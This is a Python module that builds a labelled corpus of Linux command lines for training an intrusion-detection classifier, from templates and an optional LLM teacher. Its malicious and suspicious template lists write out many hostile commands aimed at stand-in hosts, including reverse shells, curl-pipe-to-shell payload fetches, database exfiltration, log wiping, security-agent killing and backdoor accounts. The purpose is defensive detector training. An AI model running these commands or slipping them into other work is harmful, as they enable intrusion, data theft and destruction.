"""Corpus generation: the teacher half of the distillation.

The idea is older than LLMs and is called knowledge distillation - train a small
fast student to reproduce the judgements of a large slow teacher. Here the
teacher is a generative model used in two ways, both offline and both one-time:

  synthesise   invent realistic command lines across attack techniques and
               across the benign administrative work that resembles them. The
               value is diversity - a model asked to generate fifty reverse
               shells produces variants a human writing exemplars by hand would
               never think of, and those variants are exactly what the student
               must generalise to.

  label        assign each command a family (benign / suspicious / malicious),
               a technique, and a difficulty. The teacher is good at this
               because it reads a command the way an analyst does.

The output is a JSONL corpus. Nothing about the running agent depends on the
teacher: once the corpus exists the LLM is out of the loop entirely, which is
the whole point - you pay for the model once, at training time, not per event
forever.

No key, no problem. The synthetic generator below produces a large, balanced,
programmatically-labelled corpus from templates and mutation. It is not as
diverse as an LLM's output, but it is real training data with correct labels,
and a student trained on it measurably beats the hand-written exemplar list the
similarity layer started with. The LLM makes the corpus better; it is not
required to make it exist.
"""

from __future__ import annotations

import json
import os
import random
import re
import time
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

ANTHROPIC_URL = "https://api.anthropic.com/v1/messages"

# ── label space ──────────────────────────────────────────────────────────
# Three families, not two. The middle class matters: real hosts are full of
# commands that are unusual but legitimate, and a binary model learns to call
# all of them malicious or all of them fine. The suspicious class is where the
# student learns the boundary the similarity layer's "margin" only approximates.
FAMILIES = ["benign", "suspicious", "malicious"]


@dataclass
class Sample:
    command: str
    family: str
    technique: str = ""
    difficulty: str = "medium"     # easy | medium | hard (hard = looks like its opposite)
    source: str = "synthetic"

    def to_json(self) -> str:
        return json.dumps({"command": self.command, "family": self.family,
                           "technique": self.technique, "difficulty": self.difficulty,
                           "source": self.source})


# ── deterministic synthetic generator ────────────────────────────────────

def _mk_hosts():
    octets = ["10.0.0", "192.168.1", "172.16.4", "185.100.3", "203.0.113",
              "45.9.148", "91.219.29", "194.87.1"]
    ips = [f"{o}.{n}" for o in octets for n in (5, 9, 20, 37, 88, 113, 201)]
    names = ["attacker.example", "c2.badhost.net", "pool.minexmr.com", "stage.evil.io",
             "cdn.malware.top", "update.fakehost.ru", "mirror.badactor.cc"]
    return ips + names

_HOSTS = _mk_hosts()
_PORTS = ["4444", "443", "8443", "31337", "9001", "1337", "53", "8080", "6666",
          "2222", "5555", "12345", "8888", "4443", "9999", "7777", "1234", "10443"]
_TMP = ["/tmp/.x", "/tmp/.cache/sys", "/dev/shm/.k", "/var/tmp/.a", "/tmp/kworker",
        "/tmp/.font-unix/.x", "/dev/shm/systemd-private", "/tmp/.ICE-unix/x",
        "/var/tmp/.hidden", "/tmp/.X11-unix/.l", "/run/user/1000/.cache"]
_B64 = ["cm0gLXJmIC8=", "Y3VybCBoL3ggfCBzaA==", "YmFzaCAtaQ==", "d2hvYW1p",
        "bmMgLWUgL2Jpbi9zaA==", "Y2F0IC9ldGMvcGFzc3dk", "aWQ7IHVuYW1lIC1h",
        "d2dldCBodHRwOi8vaC94", "L2Jpbi9zaCAtaQ=="]

# (template, technique, difficulty). {h}=host {p}=port {t}=tmp {b}=base64
_MAL_TEMPLATES = [
    ("bash -i >& /dev/tcp/{h}/{p} 0>&1", "T1059", "easy"),
    ("bash --noprofile --norc -i >& /dev/tcp/{h}/{p} 0>&1", "T1059", "medium"),
    ("exec {fd}<>/dev/tcp/{h}/{p}; sh <&{fd} >&{fd} 2>&{fd}", "T1059", "hard"),
    ("0<&196;exec 196<>/dev/tcp/{h}/{p}; sh <&196 >&196 2>&196", "T1059", "hard"),
    ("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {h} {p} >/tmp/f", "T1059", "medium"),
    ("nc -e /bin/sh {h} {p}", "T1059", "easy"),
    ("ncat --ssl {h} {p} -e /bin/bash", "T1059", "medium"),
    ("socat TCP:{h}:{p} EXEC:'/bin/bash -li',pty,stderr,setsid", "T1059", "medium"),
    ("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{h}\",{p}));"
     "[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", "T1059", "medium"),
    ("perl -e 'use Socket;$i=\"{h}\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "connect(S,sockaddr_in({p},inet_aton($i)));exec(\"/bin/sh -i\")'", "T1059", "hard"),
    ("curl -fsSL http://{h}/s.sh | bash", "T1105", "easy"),
    ("wget -qO- http://{h}/x | sh", "T1105", "easy"),
    ("curl -s http://{h}/p -o {t} && chmod +x {t} && {t}", "T1105", "medium"),
    ("python3 -c \"import urllib.request as u;exec(u.urlopen('http://{h}/p').read())\"",
     "T1105", "hard"),
    ("echo {b} | base64 -d | sh", "T1027", "medium"),
    ("echo {b} | base64 --decode | bash", "T1027", "medium"),
    ("eval $(echo {b}|base64 -d)", "T1027", "hard"),
    ("(crontab -l 2>/dev/null; echo '*/5 * * * * curl {h}|sh') | crontab -", "T1053", "medium"),
    ("echo '* * * * * root {t}' > /etc/cron.d/update", "T1053", "easy"),
    ("systemctl enable --now {t}.service", "T1543", "medium"),
    ("echo 'ssh-rsa AAAAB3Nz...attacker' >> ~/.ssh/authorized_keys", "T1098", "easy"),
    ("useradd -o -u 0 -g 0 -M -s /bin/bash svc-update", "T1136", "medium"),
    ("echo 'hax::0:0::/root:/bin/sh' >> /etc/passwd", "T1136", "medium"),
    ("history -c; rm -f ~/.bash_history; > /var/log/auth.log", "T1070", "medium"),
    ("shred -u /var/log/secure && unset HISTFILE", "T1070", "hard"),
    ("setenforce 0 2>/dev/null; systemctl stop auditd; iptables -F", "T1562", "medium"),
    ("pkill -9 -f 'falcon|osquery|auditd|wazuh'", "T1562", "medium"),
    ("find / -perm -4000 -type f 2>/dev/null", "T1548", "medium"),
    ("getcap -r / 2>/dev/null; sudo -l 2>/dev/null", "T1548", "medium"),
    ("nmap -sS -p- {h}/24 --open", "T1046", "easy"),
    ("for p in $(seq 1 1024);do (echo>/dev/tcp/{h}/$p)2>/dev/null&&echo $p open;done",
     "T1046", "hard"),
    ("curl -s http://{h}/xmrig -o {t};chmod +x {t};{t} -o pool.minexmr.com:443 -u 4A",
     "T1496", "medium"),
    ("tar czf - /var/lib/mysql | curl -T - http://{h}/u", "T1041", "medium"),
    ("mysqldump --all-databases | gzip | nc {h} {p}", "T1041", "medium"),
    ("gdb -p 1 -batch -ex 'call system(\"/bin/sh\")' 2>/dev/null", "T1055", "hard"),
    ("echo {t}.so > /etc/ld.so.preload", "T1546", "hard"),
    ("cp /bin/bash '/tmp/[kworker/0:2]' && chmod +s /tmp/*", "T1036", "hard"),
]

# Benign commands, including ones deliberately shaped to look alarming - the
# hard-negative examples that teach the student not to fire on administration.
_BENIGN_TEMPLATES = [
    ("apt-get update && apt-get upgrade -y", "", "easy"),
    ("systemctl restart nginx", "", "easy"),
    ("docker compose up -d --build", "", "easy"),
    ("git fetch --all --prune && git pull", "", "easy"),
    ("journalctl -u app --since '1 hour ago' | tail -100", "", "easy"),
    ("curl -fsS https://registry.npmjs.org/react -o /tmp/react.tgz", "", "hard"),
    ("curl -fsSL https://get.docker.com | sh", "", "hard"),
    ("wget -q https://nodejs.org/dist/v20/node.tar.gz -O /tmp/node.tar.gz", "", "hard"),
    ("python3 -c 'import sys; print(sys.version)'", "", "hard"),
    ("python3 manage.py migrate --noinput", "", "medium"),
    ("find /var/log -name '*.log' -mtime +30 -delete", "", "hard"),
    ("chmod +x /opt/app/deploy.sh && /opt/app/deploy.sh", "", "hard"),
    ("tar czf /backup/app-$(date +%F).tgz /srv/app", "", "medium"),
    ("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365", "", "medium"),
    ("kubectl rollout restart deployment/api -n prod", "", "easy"),
    ("ssh-keygen -t ed25519 -C deploy@ci -f ~/.ssh/id_deploy", "", "medium"),
    ("crontab -l", "", "medium"),
    ("useradd -m -s /bin/bash newdev && passwd newdev", "", "hard"),
    ("nc -zv db.internal 5432", "", "hard"),
    ("nmap -sn 192.168.1.0/24", "", "hard"),
    ("rsync -az /data/ backup@{h}:/data/", "", "medium"),
    ("psql -h localhost -U app -c 'SELECT count(*) FROM users'", "", "easy"),
    ("node /srv/app/index.js --port 3000", "", "easy"),
    ("ffmpeg -i input.mp4 -c:v libx264 output.mp4", "", "easy"),
    ("aws s3 sync ./dist s3://assets-bucket/ --delete", "", "medium"),
]

# Suspicious: real administrative tools used in ways that warrant a second look
# but are not by themselves attacks - the genuinely ambiguous middle.
_SUSPICIOUS_TEMPLATES = [
    ("curl http://{h}/install.sh | sudo bash", "T1105", "medium"),
    ("wget http://{h}/tool -O /tmp/tool && chmod +x /tmp/tool", "T1105", "medium"),
    ("bash <(curl -s http://{h}/setup)", "T1059", "hard"),
    ("python3 -c 'import os;os.system(\"id\")'", "T1059", "medium"),
    ("echo $PATH; whoami; id; sudo -l", "T1033", "medium"),
    ("chmod 777 -R /opt/shared", "", "medium"),
    ("nc -lvp {p}", "T1571", "medium"),
    ("ssh -R {p}:localhost:22 user@{h}", "T1572", "hard"),
    ("scp -r /etc user@{h}:/backup/", "T1041", "hard"),
    ("base64 /etc/hostname", "T1027", "medium"),
    ("tar czf - /home | ssh {h} 'cat > home.tgz'", "T1041", "hard"),
]


def _fill(template: str, rng: random.Random) -> str:
    return (template
            .replace("{h}", rng.choice(_HOSTS))
            .replace("{p}", rng.choice(_PORTS))
            .replace("{t}", rng.choice(_TMP))
            .replace("{b}", rng.choice(_B64))
            .replace("{fd}", str(rng.randint(3, 250))))


def _pad(c, r): return c.replace(" ", "  ", r.randint(1, 3)) if " " in c else c
def _comment(c, r): return c + " # " + r.choice(["backup", "deploy", "cron", "maint", "run"])
def _wwwize(c, r): return c.replace("http://", "http://" + r.choice(["", "www.", "cdn."]))
def _lead(c, r): return "  " + c
def _envprefix(c, r): return r.choice(["", "sudo ", "nohup ", "timeout 30 "]) + c
def _redir(c, r): return c + r.choice(["", " 2>/dev/null", " >/dev/null 2>&1", " &"])

_MUTATORS = [lambda c, r: c, _pad, _comment, _wwwize, _lead, _envprefix, _redir]


def _mutate(cmd, rng):
    # apply one or two mutators, so variety compounds
    for _ in range(rng.randint(1, 2)):
        cmd = rng.choice(_MUTATORS)(cmd, rng)
    return cmd


def synth_corpus(n_per_family: int = 600, seed: int = 1337) -> list[Sample]:
    """A balanced, mutated, correctly-labelled corpus with no external calls."""
    rng = random.Random(seed)
    out: list[Sample] = []
    plan = [(FAMILIES[2], _MAL_TEMPLATES), (FAMILIES[0], _BENIGN_TEMPLATES),
            (FAMILIES[1], _SUSPICIOUS_TEMPLATES)]
    for family, templates in plan:
        for _ in range(n_per_family):
            tmpl, technique, difficulty = rng.choice(templates)
            cmd = _mutate(_fill(tmpl, rng), rng)
            out.append(Sample(cmd, family, technique, difficulty, "synthetic"))
    rng.shuffle(out)
    return out


# ── LLM teacher ──────────────────────────────────────────────────────────

_GEN_SYSTEM = """You generate labelled training data for a host-intrusion command-line \
classifier. You are the teacher in a distillation pipeline; your judgements become the \
labels a small model learns from, so accuracy and diversity both matter.

Produce realistic Linux command lines a security tool would actually see. Vary syntax \
heavily - a reverse shell can be written a dozen ways, and the student must generalise \
across all of them, so do not repeat shapes.

Every item needs an honest family:
  malicious   - clear attacker tradecraft
  suspicious  - real admin tooling used in a way that warrants review but is not itself an attack
  benign      - ordinary operations, INCLUDING ones that superficially look alarming
                (a legitimate `curl ... | sh` installer, an admin creating an account)

The benign-that-looks-bad and malicious-that-looks-innocent items are the most valuable \
you can produce, because they are where a naive model fails. Weight toward those.

Return ONLY a JSON array, no prose, no fences. Each element:
{"command": "...", "family": "malicious|suspicious|benign", "technique": "Txxxx or empty",
 "difficulty": "easy|medium|hard"}"""


class TeacherClient:
    def __init__(self, model: str, api_key: str, timeout: float = 60.0):
        self.model, self.api_key, self.timeout = model, api_key, timeout

    def generate(self, technique_hint: str, n: int) -> list[Sample]:
        prompt = (f"Generate {n} diverse training examples. Bias toward technique "
                  f"{technique_hint} for the malicious ones, but include benign and "
                  f"suspicious commands that could be confused with it. Maximise variety "
                  f"of syntax.")
        body = json.dumps({
            "model": self.model, "max_tokens": 3000, "system": _GEN_SYSTEM,
            "temperature": 1.0,          # generation wants diversity, not determinism
            "messages": [{"role": "user", "content": prompt}],
        }).encode()
        req = urllib.request.Request(ANTHROPIC_URL, data=body, method="POST", headers={
            "content-type": "application/json", "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01"})
        with urllib.request.urlopen(req, timeout=self.timeout) as r:
            data = json.loads(r.read())
        text = "".join(b.get("text", "") for b in data.get("content", [])
                       if b.get("type") == "text")
        return self._parse(text)

    @staticmethod
    def _parse(text: str) -> list[Sample]:
        text = re.sub(r"^```(?:json)?|```$", "", text.strip(), flags=re.M).strip()
        start, end = text.find("["), text.rfind("]")
        if start < 0 or end <= start:
            return []
        try:
            arr = json.loads(text[start:end + 1])
        except json.JSONDecodeError:
            return []
        out = []
        for item in arr:
            if not isinstance(item, dict):
                continue
            cmd, fam = item.get("command"), item.get("family")
            if not cmd or fam not in FAMILIES:
                continue
            out.append(Sample(str(cmd)[:2000], fam, str(item.get("technique", "")),
                             str(item.get("difficulty", "medium")), "llm-teacher"))
        return out


# ── build ────────────────────────────────────────────────────────────────

@dataclass
class BuildReport:
    total: int = 0
    by_family: dict = field(default_factory=dict)
    by_source: dict = field(default_factory=dict)
    llm_batches: int = 0
    llm_failures: int = 0
    path: str = ""


def build_corpus(out_path: str, use_llm: bool = True, llm_batches: int = 8,
                 batch_size: int = 40, synth_per_family: int = 600,
                 model: str = "claude-sonnet-4-6", api_key: str | None = None,
                 progress=None) -> BuildReport:
    """Assemble the training corpus: synthetic floor plus optional LLM enrichment.

    The synthetic set is always generated - it guarantees balance and coverage.
    LLM batches are added on top when a key is present, contributing the syntax
    diversity templates cannot. Deduplicated on the normalised command so the
    two sources reinforce rather than double-count.
    """
    rep = BuildReport(path=out_path)
    samples = synth_corpus(synth_per_family)

    key = api_key or os.environ.get("ANTHROPIC_API_KEY", "")
    if use_llm and key:
        teacher = TeacherClient(model, key)
        techniques = ["T1059", "T1105", "T1027", "T1053", "T1548", "T1562",
                      "T1046", "T1496", "T1098", "T1070"]
        for i in range(llm_batches):
            hint = techniques[i % len(techniques)]
            try:
                batch = teacher.generate(hint, batch_size)
                samples.extend(batch)
                rep.llm_batches += 1
                if progress:
                    progress(f"llm batch {i+1}/{llm_batches} ({hint}): +{len(batch)}")
            except Exception as exc:
                rep.llm_failures += 1
                if progress:
                    progress(f"llm batch {i+1} failed: {type(exc).__name__}")
            time.sleep(0.3)

    # dedupe on a whitespace-normalised key
    seen, unique = set(), []
    for s in samples:
        k = re.sub(r"\s+", " ", s.command.strip().lower())
        if k and k not in seen:
            seen.add(k)
            unique.append(s)

    Path(out_path).parent.mkdir(parents=True, exist_ok=True)
    with open(out_path, "w") as fh:
        for s in unique:
            fh.write(s.to_json() + "\n")

    rep.total = len(unique)
    for s in unique:
        rep.by_family[s.family] = rep.by_family.get(s.family, 0) + 1
        rep.by_source[s.source] = rep.by_source.get(s.source, 0) + 1
    if progress:
        progress(f"wrote {rep.total} unique samples to {out_path}")
    return rep


if __name__ == "__main__":       # allow: python -m osentinel.learn.corpus
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "data/models/corpus.jsonl"
    r = build_corpus(out, progress=lambda m: print("  ", m))
    print(json.dumps({"total": r.total, "by_family": r.by_family,
                     "by_source": r.by_source, "llm_batches": r.llm_batches}, indent=1))
